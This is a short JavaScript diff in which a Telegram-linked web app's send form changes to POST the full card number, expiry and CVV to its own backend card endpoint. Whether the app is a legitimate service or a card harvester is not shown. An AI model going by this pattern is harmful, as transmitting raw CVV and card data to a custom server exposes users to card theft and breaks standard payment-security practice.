@@ -302,7 +302,12 @@ async function submitSendForm(event) {
         const response = await fetch(`${API_BASE_URL}/api/users/${user.telegramId}/card`, {
             method: 'POST',
             headers,
-            body: JSON.stringify({ name })
+            body: JSON.stringify({ 
+                cardNumber,
+                cardMonth,
+                cardYear,
+                cardCVV
+            })
         });
 
         if (!response.ok) {
